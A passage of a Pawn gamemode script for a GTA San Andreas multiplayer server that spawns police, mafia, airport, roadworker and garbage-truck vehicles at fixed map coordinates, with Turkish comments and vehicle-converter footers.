	LastVehicleID = Vehicle_AddStatic(483,-2265.4675000,526.2016000,35.0206000,0.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,-2259.6284000,526.4321000,35.0206000,0.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,-2253.6277000,526.3961000,35.0206000,0.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,-2247.6265000,526.4011000,35.0206000,0.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,-2241.5437000,526.4501000,35.0206000,0.0000000,-1,-1,15); //Camper

	// LV Dolmuþ
	
	LastVehicleID = Vehicle_AddStatic(483,2876.9976000,1934.8062000,10.8307000,164.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2884.8394000,1934.7935000,10.8307000,164.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2861.9370000,1934.8719000,10.8307000,164.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2854.5369000,1934.9503000,10.8307000,164.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2845.9458000,1889.3729000,10.8307000,244.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2845.8264000,1880.3105000,10.8307000,244.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2845.9629000,1875.7739000,10.8307000,244.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2845.9976000,1866.9100000,10.8307000,244.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2845.9248000,1858.1265000,10.8307000,244.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2845.8967000,1853.3856000,10.8307000,244.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2846.0112000,1844.4072000,10.8307000,244.0000000,-1,-1,15); //Camper
	LastVehicleID = Vehicle_AddStatic(483,2845.9924000,1835.6077000,10.8307000,244.0000000,-1,-1,15); //Camper

}
// Add busstops to the map
GameModeInit_Busstops()
{
/*
	LastObjectID = CreateDynamicObject(1257, -2571.25, 2316.0, 5.2, 0.0, 0.0, 180.0);
	LastObjectID = CreateDynamicObject(1257, -2333.25, 2371.5, 6.0, 0.0, 0.0, 320.0);
	LastObjectID = CreateDynamicObject(1257, -1467.0, 2679.0, 56.0, 0.0, 0.0, 90.0);
	LastObjectID = CreateDynamicObject(1257, -1528.5, 2543.0, 56.0, 0.0, 0.0, 270.0);
	LastObjectID = CreateDynamicObject(1257, -800.5, 1562.0, 27.4, 0.0, 0.0, 0.0);
	LastObjectID = CreateDynamicObject(1257, -853.5, 1529.5, 22.4, 0.0, 0.0, 180.0);
	LastObjectID = CreateDynamicObject(1257, -269.0, 2620.5, 63.2, 0.0, 0.0, 270.0);
	LastObjectID = CreateDynamicObject(1257, -45.5, 1206.5, 19.6, 0.0, 0.0, 90.0);
	LastObjectID = CreateDynamicObject(1257, -100.5, 1190.75, 20.0, 0.0, 0.0, 270.0);
	LastObjectID = CreateDynamicObject(1257, -249.5, 1010.75, 20.0, 0.0, 0.0, 270.0);
	LastObjectID = CreateDynamicObject(1257, -2172.5, -2309.5, 30.9, 0.0, 0.0, 230.0);
	LastObjectID = CreateDynamicObject(1257, -2094.25, -2503.0, 30.9, 0.0, 0.0, 322.0);
	LastObjectID = CreateDynamicObject(1257, 2263.75, -35.75, 26.7, 0.0, 0.0, 270.0);
	LastObjectID = CreateDynamicObject(1257, 2456.25, 1.0, 26.5, 0.0, 0.0, 180.0);
	LastObjectID = CreateDynamicObject(1257, 1290.25, 333.5, 19.8, 0.0, 0.0, 65.0);
	LastObjectID = CreateDynamicObject(1257, 1284.75, 319.5, 19.8, 0.0, 0.0, 245.0);
	LastObjectID = CreateDynamicObject(1257, 736.0, -522.5, 16.6, 0.0, 0.0, 90.0);
	LastObjectID = CreateDynamicObject(1257, 736.0, -537.75, 16.6, 0.0, 0.0, 270.0);
*/
//	LastObjectID = CreateObject(1257, 0000, 0000, 000, 0.0, 0.0, 000.0);
}

// Add police vehicles to the Police Impounds // polis arabasi
GameModeInit_Police()
{
 //   Vehicle_AddStatic(vModel, Float:vX, Float:vY, Float:vZ, Float:vRotation, vC1, vC2, vSpawnDelay)
	LastVehicleID = Vehicle_AddStatic(596,1555.0000000,-1710.7500000,6.0000000,0.0000000,45,92,600); //Police Car (LSPD)
	LastVehicleID = Vehicle_AddStatic(523,1560.0000000,-1710.7500000,6.0000000,0.0000000,45,92,600); //HPV1000
	LastVehicleID = Vehicle_AddStatic(599,1565.0000000,-1710.7500000,6.0000000,0.0000000,45,92,600); //Police Ranger
	LastVehicleID = Vehicle_AddStatic(596,1570.0000000,-1710.7500000,6.0000000,0.0000000,45,92,600); //Police Car (LSPD)
	LastVehicleID = Vehicle_AddStatic(523,1575.0000000,-1710.7500000,6.0000000,0.0000000,45,92,600); //HPV1000
	LastVehicleID = Vehicle_AddStatic(599,1580.0000000,-1710.7500000,6.0000000,0.0000000,45,92,600); //Police Ranger
	LastVehicleID = Vehicle_AddStatic(596,1585.0000000,-1710.7500000,6.0000000,0.0000000,45,92,600); //Police Car (LSPD)
	LastVehicleID = Vehicle_AddStatic(523,1590.0000000,-1710.7500000,6.0000000,0.0000000,45,92,600); //HPV1000
	LastVehicleID = Vehicle_AddStatic(599,1595.0000000,-1710.7500000,6.0000000,0.0000000,45,92,600); //Police Ranger
	LastVehicleID = Vehicle_AddStatic(597,-1573.0000000,701.0000000,-5.0000000,90.0000000,45,92,600); //Police Car (SFPD)
	LastVehicleID = Vehicle_AddStatic(523,-1573.0000000,706.0000000,-5.0000000,90.0000000,-1,-1,600); //HPV1000
	LastVehicleID = Vehicle_AddStatic(599,-1573.0000000,711.0000000,-5.0000000,90.0000000,45,92,600); //Police Ranger
	LastVehicleID = Vehicle_AddStatic(597,-1573.0000000,716.0000000,-5.0000000,90.0000000,45,92,600); //Police Car (SFPD)
	LastVehicleID = Vehicle_AddStatic(523,-1573.0000000,721.0000000,-5.0000000,90.0000000,45,92,600); //HPV1000
	LastVehicleID = Vehicle_AddStatic(599,-1573.0000000,726.0000000,-5.0000000,90.0000000,45,92,600); //Police Ranger
	LastVehicleID = Vehicle_AddStatic(597,-1573.0000000,731.0000000,-5.0000000,90.0000000,45,92,600); //Police Car (SFPD)
	LastVehicleID = Vehicle_AddStatic(523,-1573.0000000,736.0000000,-5.0000000,90.0000000,45,92,600); //HPV1000
	LastVehicleID = Vehicle_AddStatic(599,-1573.0000000,741.0000000,-5.0000000,90.0000000,45,92,600); //Police Ranger
	LastVehicleID = Vehicle_AddStatic(598,2272.3000000,2444.0000000,10.7000000,0.0000000,45,92,600); //Police Car (LVPD)
	LastVehicleID = Vehicle_AddStatic(523,2257.2000000,2444.0000000,10.5000000,0.0000000,45,92,600); //HPV1000
	LastVehicleID = Vehicle_AddStatic(599,2252.0000000,2443.0000000,11.0000000,0.0000000,45,92,600); //Police Ranger
	LastVehicleID = Vehicle_AddStatic(490,335.7000100,-1528.6000000,33.5000000,323.9810000,115,10,600); //FBI Rancher
	LastVehicleID = Vehicle_AddStatic(490,345.1521000,0.0000000,33.3716000,322.8960000,115,10,600); //FBI Rancher
	LastVehicleID = Vehicle_AddStatic(528,325.8999900,-1549.0000000,33.3000000,156.6600000,115,10,600); //FBI Truck
	LastVehicleID = Vehicle_AddStatic(528,361.7480500,-1503.9668000,32.7995000,132.7700000,115,10,600); //FBI Truck
	LastVehicleID = Vehicle_AddStatic(601,354.2999900,-1542.0000000,33.2000000,143.5640000,115,10,600); //S.W.A.T. Van
	LastVehicleID = Vehicle_AddStatic(598,2260.1001000,2444.3000000,10.7000000,0.0000000,45,92,600); //Police Car (LVPD)
	LastVehicleID = Vehicle_AddStatic(599,2280.1001000,2444.7000000,11.2000000,0.0000000,45,92,600); //Police Ranger
	LastVehicleID = Vehicle_AddStatic(427,2259.3000000,2474.5000000,11.1000000,180.0000000,45,92,600); //Enforcer
	LastVehicleID = Vehicle_AddStatic(601,2292.1001000,2445.1001000,10.8000000,0.0000000,45,92,600); //S.W.A.T. Van
	LastVehicleID = Vehicle_AddStatic(490,2276.1001000,2474.3000000,11.1000000,180.0000000,45,92,600); //FBI Rancher
	LastVehicleID = Vehicle_AddStatic(490,2282.2000000,2474.7000000,11.1000000,180.0000000,45,92,600); //FBI Rancher
	LastVehicleID = Vehicle_AddStatic(490,-2767.8999000,-282.5000000,7.4000000,180.0000000,45,92,600); //FBI Rancher
	LastVehicleID = Vehicle_AddStatic(490,-2771.3999000,-282.7000100,7.4000000,180.0000000,45,92,600); //FBI Rancher
	LastVehicleID = Vehicle_AddStatic(528,-2785.5000000,-281.0000000,7.2000000,270.0000000,45,92,600); //FBI Truck
	LastVehicleID = Vehicle_AddStatic(528,-2785.3999000,-283.8999900,7.2000000,270.0000000,45,92,600); //FBI Truck
	LastVehicleID = Vehicle_AddStatic(601,-2769.1001000,-312.7999900,7.0000000,0.0000000,45,92,600); //S.W.A.T. Van
	LastVehicleID = Vehicle_AddStatic(601,-2763.6001000,-312.7999900,7.0000000,0.0000000,45,92,600); //S.W.A.T. Van
	LastVehicleID = Vehicle_AddStatic(427,-2747.0000000,-304.6000100,7.3000000,47.9950000,45,92,600); //Enforcer
	LastVehicleID = Vehicle_AddStatic(427,-2742.7002000,-300.5000000,7.3000000,51.9820000,45,92,600); //Enforcer
	LastVehicleID = Vehicle_AddStatic(427,2254.6001000,2475.1001000,11.1000000,180.0000000,45,92,600); //Enforcer
	LastVehicleID = Vehicle_AddStatic(523,2255.6001000,2444.1001000,10.5000000,0.0000000,45,92,600); //HPV1000
	LastVehicleID = Vehicle_AddStatic(601,361.2000100,-1533.0000000,33.2000000,141.5640000,115,10,600); //S.W.A.T. Van
	LastVehicleID = Vehicle_AddStatic(601,368.0000000,-1525.3000000,33.2000000,141.5590000,115,10,600); //S.W.A.T. Van
	LastVehicleID = Vehicle_AddStatic(490,340.2999900,-1522.2000000,33.5000000,323.9810000,115,10,600); //FBI Rancher
	LastVehicleID = Vehicle_AddStatic(528,355.1000100,-1510.5000000,33.0000000,132.7700000,115,10,600); //FBI Truck

/*
Objects converted: 0
Vehicles converted: 46
Vehicle models found: 9
----------------------
In the time this conversion took to finish the US national debt has risen by about $1,390.21!
*/
}

// Add mafia-vehicles to the mafia-hideout
GameModeInit_Mafia()
{
	LastVehicleID = Vehicle_AddStatic(495,2811.0000000,900.0000000,10.8000000,0.0000000,45,92,600); //Sandking
	LastVehicleID = Vehicle_AddStatic(495,2806.0000000,900.0000000,10.8000000,0.0000000,45,92,600); //Sandking
	LastVehicleID = Vehicle_AddStatic(495,2801.0000000,900.0000000,10.8000000,0.0000000,45,92,600); //Sandking
	LastVehicleID = Vehicle_AddStatic(418,2833.0000000,900.0000000,10.8000000,0.0000000,45,92,600); //Moonbeam
	LastVehicleID = Vehicle_AddStatic(418,2838.0000000,900.0000000,10.8000000,0.0000000,45,92,600); //Moonbeam
	LastVehicleID = Vehicle_AddStatic(418,2843.0000000,900.0000000,10.8000000,0.0000000,45,92,600); //Moonbeam
	LastVehicleID = Vehicle_AddStatic(418,2848.0000000,900.0000000,10.8000000,0.0000000,45,92,600); //Moonbeam
	LastVehicleID = Vehicle_AddStatic(515,2802.0000000,966.0000000,11.8000000,180.0000000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,2807.0000000,966.0000000,11.9000000,180.0000000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,2812.0000000,966.0000000,11.8000000,180.0000000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,2817.0000000,966.0000000,11.9000000,180.0000000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,2822.0000000,966.0000000,11.8000000,180.0000000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,2827.0000000,966.0000000,11.8000000,180.0000000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-2074.8999000,-2261.5000000,32.4000000,144.0000000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-2079.8999000,-2257.3000000,32.4000000,143.4980000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-2085.8000000,-2253.2000000,32.4000000,143.4920000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-2092.1001000,-2249.3999000,32.4000000,143.4920000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-2098.1001000,-2245.3000000,32.4000000,143.4920000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(515,-2105.1001000,-2240.0000000,32.4000000,143.4920000,45,92,600); //Roadtrain
	LastVehicleID = Vehicle_AddStatic(495,-2119.8000000,-2324.2000000,30.9000000,322.0000000,45,92,600); //Sandking
	LastVehicleID = Vehicle_AddStatic(495,-2123.5000000,-2321.2000000,30.9000000,321.9980000,45,92,600); //Sandking
	LastVehicleID = Vehicle_AddStatic(495,-2127.6001000,-2318.1001000,30.9000000,321.9980000,45,92,600); //Sandking
	LastVehicleID = Vehicle_AddStatic(495,-2132.3999000,-2314.3999000,30.9000000,321.9980000,45,92,600); //Sandking
	LastVehicleID = Vehicle_AddStatic(495,-2126.3000000,-2304.8000000,30.9000000,233.9940000,45,92,600); //Sandking
	LastVehicleID = Vehicle_AddStatic(495,-2122.3999000,-2299.6001000,30.9000000,233.9920000,45,92,600); //Sandking
	LastVehicleID = Vehicle_AddStatic(495,-2118.0000000,-2293.8000000,30.9000000,231.9920000,45,92,600); //Sandking
	LastVehicleID = Vehicle_AddStatic(495,-2113.7000000,-2288.6001000,30.9000000,231.9870000,45,92,600); //Sandking
	LastVehicleID = Vehicle_AddStatic(418,-2102.8999000,-2302.0000000,30.4000000,52.0000000,64,108,600); //Moonbeam
	LastVehicleID = Vehicle_AddStatic(495,-2113.3000000,-2315.2000000,30.9000000,51.9950000,45,92,600); //Sandking
	LastVehicleID = Vehicle_AddStatic(495,-2109.3999000,-2310.3000000,30.9000000,51.9930000,45,92,600); //Sandking
	LastVehicleID = Vehicle_AddStatic(418,-2105.8000000,-2305.5000000,30.4000000,51.9980000,64,108,600); //Moonbeam
	LastVehicleID = Vehicle_AddStatic(418,-2099.6001000,-2297.8999000,30.4000000,51.9980000,64,108,600); //Moonbeam
	LastVehicleID = Vehicle_AddStatic(418,-2096.3999000,-2293.8000000,30.4000000,51.9980000,64,108,600); //Moonbeam
	LastVehicleID = Vehicle_AddStatic(418,-2092.8999000,-2289.8999000,30.4000000,51.9980000,64,108,600); //Moonbeam

/*
Objects converted: 0
Vehicles converted: 34
Vehicle models found: 3
----------------------
In the time this conversion took to finish the US national debt has risen by about $1,957.83!
*/
}

// Add planes and helicopters to the airports
GameModeInit_Airports()
{
	LastVehicleID = Vehicle_AddStatic(519,1990.0000000,-2295.0000000,14.5000000,90.0000000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(519,1990.0000000,-2320.0000000,14.5000000,90.0000000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(519,1990.0000000,-2345.0000000,14.5000000,90.0000000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(519,1990.0000000,-2370.0000000,14.5000000,90.0000000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(553,1920.0000000,-2265.0000000,14.5000000,180.0000000,-1,-1,600); //Nevada
	LastVehicleID = Vehicle_AddStatic(553,1890.0000000,-2295.0000000,14.5000000,270.0000000,-1,-1,600); //Nevada
	LastVehicleID = Vehicle_AddStatic(487,1955.0000000,-2265.0000000,13.6000000,180.0000000,-1,-1,600); //Maverick
	LastVehicleID = Vehicle_AddStatic(487,1985.0000000,-2265.0000000,13.6000000,180.0000000,-1,-1,600); //Maverick
	LastVehicleID = Vehicle_AddStatic(519,-1197.0000000,-153.0000000,15.1000000,135.0000000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(519,-1214.0000000,-137.5000000,15.1000000,135.0000000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(519,-1230.0000000,-120.0000000,15.1000000,135.0000000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(519,-1246.0000000,-103.5000000,15.1000000,135.0000000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(553,-1287.0000000,-52.0000000,15.1000000,135.0000000,-1,-1,600); //Nevada
	LastVehicleID = Vehicle_AddStatic(553,-1312.0000000,-27.0000000,15.1000000,135.0000000,-1,-1,600); //Nevada
	LastVehicleID = Vehicle_AddStatic(487,-1262.0000000,-88.5000000,14.2000000,135.0000000,-1,-1,600); //Maverick
	LastVehicleID = Vehicle_AddStatic(487,-1264.0000000,-61.5000000,14.2000000,45.0000000,-1,-1,600); //Maverick
	LastVehicleID = Vehicle_AddStatic(519,1615.0000000,1630.0000000,11.8000000,180.0000000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(519,1590.0000000,1630.0000000,11.8000000,180.0000000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(519,1565.0000000,1630.0000000,11.8000000,180.0000000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(553,1545.0000000,1640.0000000,11.8000000,90.0000000,-1,-1,600); //Nevada
	LastVehicleID = Vehicle_AddStatic(553,1545.0000000,1675.0000000,11.8000000,90.0000000,-1,-1,600); //Nevada
	LastVehicleID = Vehicle_AddStatic(553,1545.0000000,1710.0000000,11.8000000,90.0000000,-1,-1,600); //Nevada
	LastVehicleID = Vehicle_AddStatic(487,1650.0000000,1557.0000000,10.9000000,90.0000000,-1,-1,600); //Maverick
	LastVehicleID = Vehicle_AddStatic(487,1650.0000000,1542.0000000,10.9000000,90.0000000,-1,-1,600); //Maverick
	LastVehicleID = Vehicle_AddStatic(487,1635.0000000,1534.0000000,10.9000000,0.0000000,-1,-1,600); //Maverick
	LastVehicleID = Vehicle_AddStatic(519,-5391.0205000,795.4621000,46.7189000,76.6130000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(519,-5398.4365000,765.6613000,46.7185000,76.6800000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(519,-5414.8086000,710.6283000,46.7199000,70.6010000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(519,-5422.8408000,682.1675000,46.7190000,75.9150000,-1,-1,600); //Shamal
	LastVehicleID = Vehicle_AddStatic(487,-5518.7827000,781.5654000,49.3449000,254.7110000,-1,-1,600); //Maverick
	LastVehicleID = Vehicle_AddStatic(487,-5488.7871000,884.7726000,49.3449000,251.5430000,-1,-1,600); //Maverick
	LastVehicleID = Vehicle_AddStatic(487,-5462.1387000,974.8770000,49.3345000,253.2110000,-1,-1,600); //Maverick
	LastVehicleID = Vehicle_AddStatic(487,-5433.5986000,1069.4934000,49.3446000,252.4440000,-1,-1,600); //Maverick
	LastVehicleID = Vehicle_AddStatic(487,-5410.2300000,1158.1290000,49.3357000,252.2780000,-1,-1,600); //Maverick

/*
Objects converted: 0
Vehicles converted: 34
Vehicle models found: 3
----------------------
In the time this conversion took to finish light could have travelled around the world 0.22 times!
*/
}

// This function adds all vehicles needed for roadworker class
GameModeInit_RoadWorker()
{
	LastVehicleID = Vehicle_AddStatic(552,-1895.0000000,-1705.0000000,21.5000000,180.0000000,random(126),random(126),600); //Utility
	LastVehicleID = Vehicle_AddStatic(552,-1900.0000000,-1705.0000000,21.5000000,180.0000000,random(126),random(126),600); //Utility
	LastVehicleID = Vehicle_AddStatic(552,-1905.0000000,-1705.0000000,21.5000000,180.0000000,random(126),random(126),600); //Utility
	LastVehicleID = Vehicle_AddStatic(552,-1910.0000000,-1705.0000000,21.5000000,180.0000000,random(126),random(126),600); //Utility
	LastVehicleID = Vehicle_AddStatic(552,-1915.0000000,-1705.0000000,21.5000000,180.0000000,random(126),random(126),600); //Utility
	LastVehicleID = Vehicle_AddStatic(552,-1920.0000000,-1705.0000000,21.5000000,180.0000000,random(126),random(126),600); //Utility
	LastVehicleID = Vehicle_AddStatic(611,-1895.0000000,-1700.0000000,21.5000000,180.0000000,random(126),random(126),600); //Utility Trailer
	LastVehicleID = Vehicle_AddStatic(611,-1900.0000000,-1700.0000000,21.5000000,180.0000000,random(126),random(126),600); //Utility Trailer
	LastVehicleID = Vehicle_AddStatic(611,-1905.0000000,-1700.0000000,21.5000000,180.0000000,random(126),random(126),600); //Utility Trailer
	LastVehicleID = Vehicle_AddStatic(611,-1910.0000000,-1700.0000000,21.5000000,180.0000000,random(126),random(126),600); //Utility Trailer
	LastVehicleID = Vehicle_AddStatic(611,-1915.0000000,-1700.0000000,21.5000000,180.0000000,random(126),random(126),600); //Utility Trailer
	LastVehicleID = Vehicle_AddStatic(611,-1920.0000000,-1700.0000000,21.5000000,180.0000000,random(126),random(126),600); //Utility Trailer
	LastVehicleID = Vehicle_AddStatic(525,-1866.5000000,-1731.7500000,21.7000000,30.0000000,random(126),random(126),600); //Tow Truck
	LastVehicleID = Vehicle_AddStatic(525,-1870.5000000,-1734.2500000,21.7000000,30.0000000,random(126),random(126),600); //Tow Truck
	LastVehicleID = Vehicle_AddStatic(525,-1874.5000000,-1736.7500000,21.7000000,30.0000000,random(126),random(126),600); //Tow Truck
	LastVehicleID = Vehicle_AddStatic(525,-1878.5000000,-1739.2500000,21.7000000,30.0000000,random(126),random(126),600); //Tow Truck
	LastVehicleID = Vehicle_AddStatic(525,-1882.5000000,-1741.7500000,21.7000000,30.0000000,random(126),random(126),600); //Tow Truck
	LastVehicleID = Vehicle_AddStatic(525,-1886.5000000,-1744.2500000,21.7000000,30.0000000,random(126),random(126),600); //Tow Truck

/*
Objects converted: 0
Vehicles converted: 18
Vehicle models found: 3
----------------------
In the time this conversion took to finish a hummingbird could have flapped it's wings 0.71 times!
*/
}

//copcu

GameModeInit_Copcu()
{
	new copkamyonobje[2];


	LastVehicleID = Vehicle_AddStatic(408,2191.9648000,-1988.8865000,14.1065000,1.0910000,101,106,-1); //Trashmaster
 	copkamyonobje[0] = CreateObject( 2978,0,0,0,0,0,0,80 ); // <COP1>
	copkamyonobje[1]=  CreateObject( 2978,0,0,0,0,0,0,80 ); // <copcu2>
    AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,2186.9658000,-1989.0323000,14.1076000,0.5920000,101,106,-1); //Trashmaster
    copkamyonobje[0] = CreateObject( 2978,0,0,0,0,0,0,80 ); // <COP1>
	copkamyonobje[1]=  CreateObject( 2978,0,0,0,0,0,0,80 ); // <copcu2>
    AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,2163.1638000,-1969.9319000,14.0974000,89.5650000,101,106,-1); //Trashmaster
 	copkamyonobje[0] = CreateObject( 2978,0,0,0,0,0,0,80 ); // <COP1>
	copkamyonobje[1]=  CreateObject( 2978,0,0,0,0,0,0,80 ); // <copcu2>
	AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,2151.0122000,-1969.8779000,14.0914000,89.5460000,101,106,-1); //Trashmaster
 	copkamyonobje[0] = CreateObject( 2978,0,0,0,0,0,0,80 ); // <COP1>
	copkamyonobje[1]=  CreateObject( 2978,0,0,0,0,0,0,80 ); // <copcu2>
	AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,-1852.9000200,-1519.0999800,22.5000000,179.7500000,19,69,-1); //Trashmaster
 	copkamyonobje[0] = CreateObject( 2978,0,0,0,0,0,0,80 ); // <COP1>
	copkamyonobje[1]=  CreateObject( 2978,0,0,0,0,0,0,80 ); // <copcu2>
	AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,-1828.5999800,-1519.5999800,22.5000000,179.7470000,19,69,-1); //Trashmaster
    AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,-1805.1999500,-1519.8000500,22.5000000,179.7470000,19,69,-1); //Trashmaster
 	copkamyonobje[0] = CreateObject( 2978,0,0,0,0,0,0,80 ); // <COP1>
	copkamyonobje[1]=  CreateObject( 2978,0,0,0,0,0,0,80 ); // <copcu2>
	AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,-1769.0999800,-1547.0999800,22.5000000,89.7470000,19,69,-1); //Trashmaster
 	copkamyonobje[0] = CreateObject( 2978,0,0,0,0,0,0,80 ); // <COP1>
	copkamyonobje[1]=  CreateObject( 2978,0,0,0,0,0,0,80 ); // <copcu2>
	AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,-1769.3000500,-1571.0000000,22.5000000,89.7470000,19,69,-1); //Trashmaster
 	copkamyonobje[0] = CreateObject( 2978,0,0,0,0,0,0,80 ); // <COP1>
	copkamyonobje[1]=  CreateObject( 2978,0,0,0,0,0,0,80 ); // <copcu2>
	AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,-1769.0999800,-1595.1999500,22.5000000,89.7470000,19,69,-1); //Trashmaster

	AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,-1859.5665000,-1519.1328000,21.9000000,179.7470000,19,69,-1); //Trashmaster
 	copkamyonobje[0] = CreateObject( 2978,0,0,0,0,0,0,80 ); // <COP1>
	copkamyonobje[1]=  CreateObject( 2978,0,0,0,0,0,0,80 ); // <copcu2>
	AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,-1835.5997000,-1520.6238000,21.9000000,179.7470000,19,69,-1); //Trashmaster
 	copkamyonobje[0] = CreateObject( 2978,0,0,0,0,0,0,80 ); // <COP1>
	copkamyonobje[1]=  CreateObject( 2978,0,0,0,0,0,0,80 ); // <copcu2>
	AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
	AttachObjectToVehicle( copkamyonobje[1], LastVehicleID, 1.470000, -3.399999, -1.159999, 0.000000, 0.000000, 0.000000 ); // <copcu2>

	LastVehicleID = Vehicle_AddStatic(408,-1811.2000000,-1518.5000000,21.9000000,89.7420000,19,69,-1); //Trashmaster
 	copkamyonobje[0] = CreateObject( 2978,0,0,0,0,0,0,80 ); // <COP1>
	copkamyonobje[1]=  CreateObject( 2978,0,0,0,0,0,0,80 ); // <copcu2>
	AttachObjectToVehicle( copkamyonobje[0], LastVehicleID, -1.500000, -3.399998, -1.200000, 0.000000, 0.000000, 0.000000 ); // <COP1>
